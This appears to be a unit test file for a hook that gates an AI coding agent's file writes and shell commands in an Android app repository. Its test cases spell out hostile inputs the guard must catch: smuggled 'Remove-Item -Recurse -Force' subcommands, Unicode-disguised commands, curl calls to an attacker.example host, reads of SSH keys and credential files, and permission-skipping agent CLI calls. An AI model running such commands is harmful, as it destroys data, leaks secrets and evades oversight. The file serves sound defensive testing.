// Unit tests for the Code Freeze Guard and Governance Infrastructure.
// Run: node --test .agents/scripts/code-freeze-guard.test.js
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import {
    REPO_ROOT,
    SOURCE_HOSTS,
    assessTestIntegrity,
    decide,
    extractInput,
    isPlanContentApproved,
    isTestFile,
    sensitiveCategory,
    stripSafeSuffixes,
    toRepoRelative,
    tokenizeCommand
} from './code-freeze-guard.js';

const repo = (rel) => path.join(REPO_ROOT, rel);
const SRC = 'app/src/main/java/com/personal/apptruyen';
const frozen = { planApproved: false };
const approved = { planApproved: true };

describe('path normalisation and sensitivity (P1 - P5)', () => {
    test('P1 & P4: normalises paths and detects sensitive files regardless of case and quirks', () => {
        assert.equal(toRepoRelative(repo(`${SRC}/ui/home/HomeScreen.kt`)), `${SRC}/ui/home/HomeScreen.kt`);
        assert.equal(toRepoRelative('docs/plans/a.md'), 'docs/plans/a.md');
        assert.equal(toRepoRelative(path.resolve(REPO_ROOT, '..', 'other.kt')), null);

        // P4: valid source path
        assert.equal(decide({ targetFile: repo(`${SRC}/ui/home/HomeViewModel.kt`) }, approved).decision, 'allow');
        assert.equal(decide({ targetFile: repo(`${SRC}/ui/home/HomeViewModel.kt`) }, frozen).decision, 'ask');

        // P1: case-insensitivity, segment dot/space, streams
        const P1_CASES = [
            'AGENTS.MD',
            '.Agents/rules/00-core.md',
            '.AGENTS/hooks.json',
            'App/Build.gradle.kts',
            'BUILD.GRADLE.KTS',
            'Local.properties',
            'KEYSTORE.properties',
            '.Env',
            '.GIT/hooks/pre-commit',
            `${SRC}/data/local/appdatabase.kt`,
            `${SRC}/data/remote/Cookie/WebViewCookieHandler.kt`,
            'AGENTS.md.',
            'AGENTS.md ',
            'AGENTS.md::$DATA',
            '.agents./hooks.json'
        ];
        for (const file of P1_CASES) {
            assert.equal(decide({ targetFile: repo(file) }, approved).decision, 'ask', file);
        }
    });

    test('P2: build infrastructure and test infrastructure files always ask', () => {
        const P2_CASES = [
            'gradle/wrapper/gradle-wrapper.jar',
            'gradle/gradle-daemon-jvm.properties',
            'buildSrc/build.gradle.kts',
            'init.gradle.kts',
            '.github/workflows/release.yml',
            'app/lint.xml',
            'app/lint-baseline.xml',
            '.gitattributes',
            'app/src/testDebug/java/com/personal/apptruyen/A.kt',
            'app/src/sharedTest/java/com/personal/apptruyen/A.kt'
        ];
        for (const file of P2_CASES) {
            assert.equal(decide({ targetFile: repo(file) }, approved).decision, 'ask', file);
        }
    });

    test('P3: Claude configuration and MCP files always ask', () => {
        const P3_CASES = [
            '.claude/settings.json',
            '.claude/settings.local.json',
            'CLAUDE.md',
            'claude.md',
            'CLAUDE.local.md',
            '.mcp.json'
        ];
        for (const file of P3_CASES) {
            assert.equal(decide({ targetFile: repo(file) }, approved).decision, 'ask', file);
        }
    });

    test('P5: regression file writes', () => {
        assert.equal(decide({ targetFile: repo('docs/architecture.md') }, frozen).decision, 'allow');
        assert.equal(
            decide(
                {
                    toolName: 'write_to_file',
                    targetFile: repo('docs/plans/2026-10-11-x-implementation-plan.md'),
                    codeContent: '# Kế hoạch\n\n> **Trạng thái**: Ready for Review\n> **Revision**: 1\n\n## Technical Plan\n',
                    stepIdx: 1
                },
                frozen
            ).decision,
            'allow'
        );
        assert.equal(decide({ targetFile: repo('implementation_plan.md') }, frozen).decision, 'allow');
        assert.equal(decide({ targetFile: repo('task.md') }, frozen).decision, 'allow');
        assert.equal(decide({ targetFile: repo('walkthrough.md') }, frozen).decision, 'allow');

        const brain = path.join(os.homedir(), '.gemini', 'antigravity', 'brain', 'abc');
        assert.equal(decide({ targetFile: path.join(brain, 'plan.md') }, frozen).decision, 'allow');
        assert.equal(decide({ targetFile: path.join(brain, 'scratch', 'Probe.kt') }, frozen).decision, 'allow');
        assert.equal(decide({ targetFile: path.join(brain, 'scratch', 'run.ps1') }, frozen).decision, 'ask');
        assert.equal(decide({ targetFile: path.join(os.homedir(), 'Desktop', 'x.md') }, frozen).decision, 'ask');
    });

    test('Test files trigger Test Integrity Guard', () => {
        const rel = 'app/src/test/java/com/personal/apptruyen/tts/TtsTextPreprocessorTest.kt';
        assert.ok(isTestFile(rel));
        const result = decide(
            { targetFile: repo(rel), oldContent: 'assertEquals(1, a)\nassertEquals(2, b)', newContent: 'assertNotNull(a)' },
            approved
        );
        assert.equal(result.decision, 'ask');
        assert.match(result.reason ?? '', /fewer assertion/);
    });
});

describe('command bypasses must ask (C1 - C9, C1b)', () => {
    const ask = (cmd, opts = frozen) => {
        const res = decide({ command: cmd }, opts);
        assert.equal(res.decision, 'ask', `Expected ask for: ${cmd}`);
        return res;
    };

    test('C1: F03 semicolon, subexpressions, and newlines must ask', () => {
        const C1_CASES = [
            "Get-Content (iex 'Remove-Item -Recurse app')",
            'git log (Remove-Item -Recurse -Force app)',
            'node --test (Remove-Item -Recurse -Force app)',
            'git status @(Remove-Item -Recurse app)',
            'powershell -File .agents/scripts/run-claude.ps1 (Remove-Item -Recurse -Force app)',
            'Get-Content README.md\nRemove-Item -Recurse -Force app',
            'Test-Path x\n.\\gradlew.bat publish',
            'powershell -File .agents/scripts/run-claude.ps1\nRemove-Item -Recurse -Force app',
            'Get-Content README.md\rRemove-Item -Recurse -Force app',
            'Get-Content README.md\u2028Remove-Item -Recurse -Force app',
            'Get-Content README.md\u2029Remove-Item -Recurse -Force app'
        ];
        for (const cmd of C1_CASES) {
            ask(cmd);
        }
    });

    test('C1b: N1 Unicode quotes, dashes, spaces, and non-ASCII characters must ask [NON_ASCII_COMMAND]', () => {
        const C1B_CASES = [
            'Get-Content "README.md\u201D (Remove-Item -Recurse -Force app) \u201Cx"',
            'Test-Path "zz\u201D (Get-Date -Format yyyy-MM-dd) \u201Czz"',
            'Get-Content "README.md\u201E (Remove-Item app) \u201Cx"',
            "Get-Content 'a\u2019 (Remove-Item app) \u2018b'",
            'git diff \u2013\u2013output=app/x.kt',
            'Get-Content \u2014Path README.md',
            'git\u00A0status',
            'Get-Content\u3000README.md',
            'git status | Select-String "a\u201D (Remove-Item app) \u201Cb"',
            'git status | Select-String "Chương"',
            '\uFEFFgit status',
            'git sta\u200Btus'
        ];
        for (const cmd of C1B_CASES) {
            const res = ask(cmd);
            assert.match(res.reason, /\[NON_ASCII_COMMAND\]/, `Expected NON_ASCII_COMMAND for ${cmd}`);
        }
    });

    test('C2: F04 node commands outside allowlist must ask', () => {
        const C2_CASES = [
            'node --test C:\\Users\\wyemh\\.gemini\\antigravity\\brain\\abc\\scratch\\pwn.js',
            'node --test --import=./x.mjs',
            'node --test --require ./evil.cjs',
            'node --test -e process.exit(1)',
            'node --test --test-reporter-destination=app/src/main/x.kt',
            'node --test .agents/scripts/code-freeze-guard.test.js --import=./x.mjs'
        ];
        for (const cmd of C2_CASES) {
            ask(cmd);
        }
    });

    test('C3: F04 dangerous scratch files must ask', () => {
        const brain = path.join(os.homedir(), '.gemini', 'antigravity', 'brain', 'abc', 'scratch');
        assert.equal(decide({ targetFile: path.join(brain, 'pwn.js') }, frozen).decision, 'ask');
        assert.equal(decide({ targetFile: path.join(brain, 'x.kts') }, frozen).decision, 'ask');
        assert.equal(decide({ targetFile: path.join(brain, 'x.html') }, frozen).decision, 'ask');
    });

    test('C4: F05 claude CLI and run-claude anomalies must ask', () => {
        const C4_CASES = [
            'claude -p "rm everything" --dangerously-skip-permissions',
            'claude mcp add evil -- calc',
            'claude config set x y',
            'claude --version',
            'powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile ..\\x.md',
            'powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/a.md -Extra x',
            'powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md -NoGradle -NoGradle',
            'powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md -NoGradle=1'
        ];
        for (const cmd of C4_CASES) {
            ask(cmd);
        }
    });

    test('C5 & C6: F06, N3, N4, D6, P03 curl and network command violations must ask', () => {
        // (a) output flags
        ask('curl.exe -q -s https://truyenfull.today/ -oapp/src/main/java/A.kt');
        ask('curl.exe -q -s https://truyenfull.today/ -O');
        ask('curl.exe -q -s https://truyenfull.today/ -D app/x.kt');
        ask('curl.exe -q -s https://truyenfull.today/ --trace app/x.kt');
        ask('curl.exe -q -s https://truyenfull.today/ --stderr app/x.kt');
        ask('curl.exe -q -s https://truyenfull.today/ -K cfg.txt');
        // (b) missing/misplaced -q
        ask('curl.exe -s https://truyenfull.today/');
        ask('curl.exe -s -q https://truyenfull.today/');
        ask('curl.exe -qs https://truyenfull.today/');
        // (c) redirect
        ask('curl.exe -q -sL https://truyenfull.today/');
        ask('curl.exe -q -s -L https://truyenfull.today/');
        // (d) disallowed flags
        ask('curl.exe -q -s -H "X: y" https://truyenfull.today/');
        ask('curl.exe -q -s -x http://127.0.0.1:8080 https://truyenfull.today/');
        ask('curl.exe -q -s -X POST https://truyenfull.today/');
        ask('curl.exe -q -s -d x https://truyenfull.today/');
        ask('curl.exe -q -s -A Mozilla https://truyenfull.today/'); // unquoted UA
        // (e) invalid URLs
        ask('curl.exe -q -s https://attacker.example/ZXhmaWw');
        ask('curl.exe -q -s https://truyenfull.today.attacker.example/');
        ask('curl.exe -q -s https://user:pw@truyenfull.today/');
        ask('curl.exe -q -s https://truyenfull.vision/');
        ask('curl.exe -q -s https://tangthuvien.vn/');
        ask('curl.exe -q -s http://truyenfull.today/');
        ask('curl.exe -q -s https://truyenfull.today:8443/');
        ask('curl.exe -q -s https://1.2.3.4/');
        ask('curl.exe -q -s https://www.truyenfull.today/'); // truyenfull doesn't use www
        ask('curl.exe -q -s https://truyenfull.today?q=1'); // missing /
        ask('curl.exe -q -s https://truyenfull.today/a#b');
        ask('curl.exe -q -s https://truyenfull.today/ https://sstruyen.net/');
        ask('curl.exe -q -s');
        // (f) parser mismatch
        ask('curl.exe -q -s "https://truyenfull.today\\@attacker.example/x"');
        ask('curl.exe -q -s https://truyenfull.today\\@attacker.example/x');
        ask('curl.exe -q -s "https://truyenfull.today@attacker.example/"');
        ask('curl.exe -q -s "https://truyenfull.today/?q=1"'); // quoted URL
        // (h) other network commands
        const netCmds = [
            'curl -s https://truyenfull.today/',
            'wget https://truyenfull.today/',
            'Invoke-WebRequest https://truyenfull.today/',
            'iwr https://truyenfull.today/',
            'irm https://truyenfull.today/',
            'Invoke-RestMethod https://truyenfull.today/',
            'Start-BitsTransfer https://truyenfull.today/ x',
            'curl -sL https://truyenfull.vision/',
            'curl -o app/x.kt https://x'
        ];
        for (const cmd of netCmds) {
            const res = ask(cmd);
            assert.match(res.reason, /\[NETWORK_COMMAND\]/);
        }
    });

    test('C7: F08 reading secrets, traversal, devices and outside working tree must ask', () => {
        const C7_CASES = [
            'Get-Content C:\\Users\\wyemh\\.claude.json',
            'Get-Content ~/.gradle/gradle.properties',
            'Get-Content $HOME\\.claude\\.credentials.json',
            'Get-Content C:\\Users\\wyemh\\.ssh\\id_ed25519',
            'Get-ChildItem -Path HKCU:\\Software',
            'Get-Content l*.properties',
            'Get-Content ke?store.properties',
            'git diff --no-index C:/Users/wyemh/.claude.json NUL',
            'Get-Content ..\\other\\x.txt',
            'git diff C:/Windows/win.ini NUL',
            'git diff C:/Users/wyemh/.android/adbkey NUL',
            'git diff ..\\other\\x.txt NUL',
            'git diff --stat D:/x.txt C:/y.txt',
            'git diff .. README.md',
            'git diff README.md nul.txt',
            'git diff README.md /dev/null',
            'git diff -- ../x',
            'git show HEAD:local.properties',
            'git log -- \\\\server\\share\\x',
            'git blame app/release.key',
            'Get-Content app/debug.pem',
            'Get-Content NUL',
            'Get-Content https://truyenfull.today/',
            'git diff https://truyenfull.today/'
        ];
        for (const cmd of C7_CASES) {
            ask(cmd);
        }
    });

    test('C8: P04, m-e git commas, invalid formats, and mixed quotes must ask', () => {
        const C8_CASES = [
            'git diff HEAD,--output=app/x.kt',
            'git log a,b',
            'Select-String -Path docs\\scraping.md -Pattern "x" -Context 2,2',
            'git log --format=%H',
            'git log --pretty=format:x',
            'git log -L1,5:README.md',
            'git log --grep="a b"',
            'Get-Content a"b"',
            'Get-Content "a"b',
            'Select-String -Pattern "a""b" -Path README.md',
            'Get-Content a?b',
            'git log ~1'
        ];
        for (const cmd of C8_CASES) {
            ask(cmd);
        }
    });

    test('C9: Regression ask tests', () => {
        ask('git commit -m x');
        ask('git push');
        ask('Remove-Item -Recurse build');
        ask('git status > out.txt');
        ask('git status | Out-File x.txt');
        ask('Get-Content keystore.properties');
        ask('Get-Content local.properties');
        ask('Get-ChildItem env:');
        ask('npm install');
        ask('git status; Remove-Item x');
    });
});

describe('allowed commands (L1 - L9)', () => {
    const allow = (cmd, opts = frozen) => {
        assert.equal(decide({ command: cmd }, opts).decision, 'allow', `Expected allow for: ${cmd}`);
    };

    test('L1 & L2: Gradle verification tasks and pipe suffixes are allowed', () => {
        allow('.\\gradlew.bat testDebugUnitTest');
        allow('.\\gradlew.bat ktlintCheck');
        allow('.\\gradlew.bat assembleDebug');
        allow('.\\gradlew.bat :app:compileDebugKotlin --stacktrace');
        allow('.\\gradlew.bat testDebugUnitTest --tests "com.personal.apptruyen.tts.*"');
        allow('.\\gradlew.bat ktlintCheck; .\\gradlew.bat testDebugUnitTest');
        allow('.\\gradlew.bat testDebugUnitTest 2>&1 | Tee-Object -FilePath build\\test-output.txt');
        allow('.\\gradlew.bat testDebugUnitTest --info 2>&1 | Select-String "BUILD|FAIL|tests completed"');
    });

    test('L3: Git read-only in working tree is allowed', () => {
        allow('git status');
        allow('git diff --stat');
        allow('git log --oneline -n 5');
        allow('git show HEAD --stat');
        allow('git blame docs/changelog.md');
        allow('git diff docs/changelog.md');
        allow('git diff HEAD docs/changelog.md');
        allow('git diff main..HEAD --stat');
        allow('git log --oneline -n 3 -- app/src/main');
        allow('git diff -- .agents/scripts');
    });

    test('L4: Allowed node commands are allowed', () => {
        allow('node --test .agents/scripts/code-freeze-guard.test.js');
        allow('node --test .agents\\scripts\\code-freeze-guard.test.js');
        allow('node --test .agents/scripts/plan-approval.test.js');
        allow('node --test .agents/scripts/review-run.test.js');
        allow('node .agents/scripts/plan-approval.js status');
        allow('node .agents/scripts/plan-approval.js status --plan docs/plans/2026-10-11-governance-audit-remediation-implementation-plan.md');
    });

    test('L5: PowerShell read cmdlets are allowed', () => {
        allow('Get-Content docs\\architecture.md');
        allow(`Get-Content ${repo('docs/architecture.md')}`);
        allow('Get-Content docs\\architecture.md -TotalCount 20');
        allow('Select-String -Path docs\\scraping.md -Pattern "selector"');
        allow('Test-Path app\\schemas');
        allow('Get-ChildItem docs\\plans');
        allow('Get-ChildItem -Path . -Name');
    });

    test('L6: Read-only curl.exe -q to source hosts (D6) is allowed', () => {
        allow('curl.exe -q -s https://truyenfull.today/');
        allow('curl.exe -q -sI --max-time 10 https://www.lacatruyen.buzz/');
        allow('curl.exe -q -s -A "Mozilla/5.0 (Windows NT 10.0)" https://sstruyen.net/search?s=abc | Select-String "div.chapter-c > p"');
        allow('curl.exe -q -s https://truyenfull.today/?q=1');
        allow('curl.exe -q -s -S --compressed -m 20 https://tangthuvien.org/doc-truyen/abc/chuong-1');
        allow('curl.exe -q -s https://truyencom.com/a-b/chuong-1.html');
        allow('curl.exe -q -s https://lacatruyen.world/x%20y~z');
        allow('CURL.EXE -q -s https://truyenfull.today/');

        // Safe suffixes
        allow('git log --oneline -n 3 | Select-String "div.chapter-c > p"');
        allow('Get-Content docs\\scraping.md | Select-String "div.chapter-c > p"');
        allow('Select-String -Path docs\\scraping.md -Pattern "curl"');
    });

    test('L7: run-claude.ps1 invocations with valid arguments are allowed', () => {
        allow('powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md');
        allow('powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md -Model opus');
        allow('powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md -NoGradle');
        allow('powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -PlanFile docs/plans/2026-10-11-x-implementation-plan.md -NoGradle -Model opus');
        allow('powershell -ExecutionPolicy Bypass -File .agents/scripts/run-claude.ps1 -CheckOnly');
    });

    test('L8: Mutating Gradle tasks obey approval status', () => {
        assert.equal(decide({ command: '.\\gradlew.bat ktlintFormat' }, frozen).decision, 'ask');
        assert.equal(decide({ command: '.\\gradlew.bat ktlintFormat' }, approved).decision, 'allow');
        assert.equal(decide({ command: '.\\gradlew.bat clean; .\\gradlew.bat assembleDebug' }, approved).decision, 'allow');
    });

    test('L9: ASCII parameters and tabs between tokens are allowed', () => {
        allow('Select-String -Path docs\\scraping.md -Pattern "Ch.{1,2}ng" -Context 2');
        allow('git log --format=oneline -n 3');
        allow('git log --pretty=short -n 1');
        allow('git status | Select-String "div.chapter-c > p (a)"');
        allow('git\tstatus');
    });
});

describe('hook contract and governance verification (H1 - H10)', () => {
    test('H1 & H1b: extractInput handles multi_replace_file_content and JSON string ReplacementChunks', () => {
        // H1
        const input1 = extractInput({
            toolCall: {
                name: 'multi_replace_file_content',
                args: {
                    TargetFile: 'app/src/main/java/x/A.kt',
                    ReplacementChunks: [
                        { TargetContent: 'val a = 1', ReplacementContent: 'val a = 2' }
                    ]
                }
            }
        });
        assert.equal(decide(input1, frozen).decision, 'ask');

        // H1b
        const chunksJson = JSON.stringify([
            { TargetContent: 'val a = 1', ReplacementContent: 'val a = 2', AllowMultiple: 'false', StartLine: '1', EndLine: '5' }
        ]);
        const input1b = extractInput({
            toolCall: {
                name: 'multi_replace_file_content',
                args: {
                    TargetFile: 'app/src/main/java/x/A.kt',
                    ReplacementChunks: chunksJson
                }
            }
        });
        assert.equal(decide(input1b, frozen).decision, 'ask');
    });

    test('H2, H3, H4: spawn test hook as platform (Windows cmd.exe /d /c)', (t) => {
        if (process.platform !== 'win32') {
            t.skip('H2-H4 only runs on win32 platform');
            return;
        }

        const agentsDir = path.join(REPO_ROOT, '.agents');

        // H2: git status allow
        const p2 = spawnSync('cmd.exe', ['/d', '/c', 'node scripts/code-freeze-guard.js --event pre'], {
            cwd: agentsDir,
            input: JSON.stringify({ toolCall: { name: 'run_command', args: { CommandLine: 'git status' } } }),
            encoding: 'utf8'
        });
        assert.equal(p2.status, 0);
        const out2 = JSON.parse(p2.stdout.trim());
        assert.equal(out2.decision, 'allow');

        // H3: write AGENTS.md ask
        const p3 = spawnSync('cmd.exe', ['/d', '/c', 'node scripts/code-freeze-guard.js --event pre'], {
            cwd: agentsDir,
            input: JSON.stringify({ toolCall: { name: 'write_to_file', args: { TargetFile: 'AGENTS.md', CodeContent: '# X' } } }),
            encoding: 'utf8'
        });
        assert.equal(p3.status, 0);
        const out3 = JSON.parse(p3.stdout.trim());
        assert.equal(out3.decision, 'ask');

        // H4: invalid JSON force_ask
        const p4 = spawnSync('cmd.exe', ['/d', '/c', 'node scripts/code-freeze-guard.js --event pre'], {
            cwd: agentsDir,
            input: 'not json',
            encoding: 'utf8'
        });
        assert.equal(p4.status, 0);
        const out4 = JSON.parse(p4.stdout.trim());
        assert.equal(out4.decision, 'force_ask');
        assert.match(out4.reason, /\[PAYLOAD_UNREADABLE\]/);
    });

    test('H5: hooks.json matches specification', () => {
        const hooksPath = path.join(REPO_ROOT, '.agents', 'hooks.json');
        const hooks = JSON.parse(fs.readFileSync(hooksPath, 'utf8'));
        const cfg = hooks['code-freeze-guard'];
        assert.equal(cfg.enabled, true);

        // PreToolUse
        const pre = cfg.PreToolUse[0];
        assert.equal(pre.matcher, 'write_to_file|replace_file_content|multi_replace_file_content|run_command');
        assert.equal(pre.hooks[0].command, 'node scripts/code-freeze-guard.js --event pre');

        // PostToolUse
        const post = cfg.PostToolUse[0];
        assert.equal(post.matcher, 'write_to_file|replace_file_content|multi_replace_file_content');
        assert.equal(post.hooks[0].command, 'node scripts/code-freeze-guard.js --event post');
    });

    test('H6b(a): run-claude.ps1 checks precede prepare call', () => {
        const scriptPath = path.join(REPO_ROOT, '.agents', 'scripts', 'run-claude.ps1');
        const content = fs.readFileSync(scriptPath, 'utf8');
        const prepareIdx = content.indexOf('review-run.js", "prepare');
        assert.ok(prepareIdx > 0, 'Must invoke prepare');

        const exit40Idx = content.indexOf('exit 40');
        const templateIdx = content.indexOf('[TEMPLATE_NOT_FOUND]');
        const planInvalidIdx = content.indexOf('[PLAN_PATH_INVALID]');
        const checkOnlyIdx = content.indexOf('if ($CheckOnly)');

        assert.ok(exit40Idx > 0 && exit40Idx < prepareIdx, 'exit 40 must precede prepare');
        assert.ok(templateIdx > 0 && templateIdx < prepareIdx, 'TEMPLATE_NOT_FOUND must precede prepare');
        assert.ok(planInvalidIdx > 0 && planInvalidIdx < prepareIdx, 'PLAN_PATH_INVALID must precede prepare');
        assert.ok(checkOnlyIdx > 0 && checkOnlyIdx < prepareIdx, 'CheckOnly must precede prepare');
    });

    test('H7: claude-reviewer-prompt.md contains 0 double quotes', () => {
        const promptPath = path.join(REPO_ROOT, '.agents', 'scripts', 'claude-reviewer-prompt.md');
        const content = fs.readFileSync(promptPath, 'utf8');
        const quoteCount = (content.match(/"/g) || []).length;
        assert.equal(quoteCount, 0, `Expected 0 double quotes in prompt, found ${quoteCount}`);
    });

    test('H7b: Reviewer CLI configuration synchronization', () => {
        const promptPath = path.join(REPO_ROOT, '.agents', 'scripts', 'claude-reviewer-prompt.md');
        const settingsPath = path.join(REPO_ROOT, '.agents', 'scripts', 'claude-reviewer-settings.json');
        const scriptPath = path.join(REPO_ROOT, '.agents', 'scripts', 'run-claude.ps1');

        const prompt = fs.readFileSync(promptPath, 'utf8');
        const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
        const script = fs.readFileSync(scriptPath, 'utf8');

        // (a) Prompt has no --tests and no shell command blocks
        assert.ok(!prompt.includes('--tests'));
        assert.ok(!prompt.includes('./gradlew.bat'));

        // (b) & (c) Permissions allow/deny Bash
        assert.ok(!settings.permissions.allow.some((p) => p.startsWith('Bash') || p.startsWith('PowerShell')));
        assert.ok(!settings.permissions.allow.includes('WebFetch'));
        assert.ok(settings.permissions.deny.includes('Bash'));
        assert.ok(settings.permissions.deny.includes('PowerShell'));

        // (d) & (f) 17 hosts
        const webFetchHosts = settings.permissions.allow
            .filter((p) => p.startsWith('WebFetch(domain:'))
            .map((p) => p.replace('WebFetch(domain:', '').replace(')', ''));

        const expected17 = [
            ...SOURCE_HOSTS,
            'developer.android.com',
            'kotlinlang.org',
            'square.github.io',
            'jsoup.org',
            'code.claude.com',
            'git-scm.com',
            'nodejs.org',
            'learn.microsoft.com',
            'curl.se'
        ];
        assert.deepEqual(webFetchHosts.sort(), expected17.sort());

        // (e) run-claude tools
        assert.ok(script.includes('--tools", "Read,Grep,Glob,Edit,WebFetch,WebSearch'));
        assert.ok(script.includes('"Bash"'));
    });

    test('H8: allowlist.md example synchronization', () => {
        const allowlistPath = path.join(REPO_ROOT, '.agents', 'agents', 'reviewer', 'allowlist.md');
        const content = fs.readFileSync(allowlistPath, 'utf8');

        const extractLines = (header) => {
            const start = content.indexOf(header);
            assert.ok(start !== -1, `Header ${header} not found in allowlist.md`);
            const fenceStart = content.indexOf('\n', start) + 1;
            const fenceEnd = content.indexOf('```', fenceStart);
            return content.substring(fenceStart, fenceEnd)
                .split('\n')
                .map((l) => l.trim())
                .filter((l) => l.length > 0 && !l.startsWith('#'));
        };

        const allowLines = extractLines('# hook-allow-examples');
        for (const line of allowLines) {
            assert.equal(decide({ command: line }, frozen).decision, 'allow', `Line from allowlist examples must allow: ${line}`);
        }

        const askLines = extractLines('# hook-ask-examples');
        for (const line of askLines) {
            assert.equal(decide({ command: line }, frozen).decision, 'ask', `Line from ask examples must ask: ${line}`);
        }
    });

    test('H9: Missing approval module triggers force_ask [GUARD_MODULE_LOAD_FAILED]', () => {
        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-h9-'));
        try {
            const scriptsDir = path.join(tmpDir, '.agents', 'scripts');
            fs.mkdirSync(scriptsDir, { recursive: true });
            fs.copyFileSync(
                path.join(REPO_ROOT, '.agents', 'scripts', 'code-freeze-guard.js'),
                path.join(scriptsDir, 'code-freeze-guard.js')
            );
            fs.copyFileSync(
                path.join(REPO_ROOT, 'package.json'),
                path.join(tmpDir, 'package.json')
            );

            const p = spawnSync('node', ['scripts/code-freeze-guard.js', '--event', 'pre'], {
                cwd: path.join(tmpDir, '.agents'),
                input: JSON.stringify({ toolCall: { name: 'run_command', args: { CommandLine: 'git status' } } }),
                encoding: 'utf8'
            });
            assert.equal(p.status, 0);
            const res = JSON.parse(p.stdout.trim());
            assert.equal(res.decision, 'force_ask');
            assert.match(res.reason, /\[GUARD_MODULE_LOAD_FAILED\]/);
        } finally {
            fs.rmSync(tmpDir, { recursive: true, force: true });
        }
    });

    test('H10: PostToolUse hook clears pending write lock', () => {
        const lockPath = path.join(REPO_ROOT, '.agents', '.pending-plan-writes.json');
        const initial = {
            'docs/plans/test-h10.md': { stepIdx: 99999, at: Date.now() }
        };
        fs.writeFileSync(lockPath, JSON.stringify(initial), 'utf8');

        try {
            const p = spawnSync('node', ['scripts/code-freeze-guard.js', '--event', 'post'], {
                cwd: path.join(REPO_ROOT, '.agents'),
                input: JSON.stringify({ stepIdx: 99999 }),
                encoding: 'utf8'
            });
            assert.equal(p.status, 0);
            assert.equal(p.stdout.trim(), '{}');

            const updated = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
            assert.equal(updated['docs/plans/test-h10.md'], undefined);
        } finally {
            if (fs.existsSync(lockPath)) {
                try {
                    const data = JSON.parse(fs.readFileSync(lockPath, 'utf8'));
                    delete data['docs/plans/test-h10.md'];
                    fs.writeFileSync(lockPath, JSON.stringify(data), 'utf8');
                } catch {}
            }
        }
    });
});
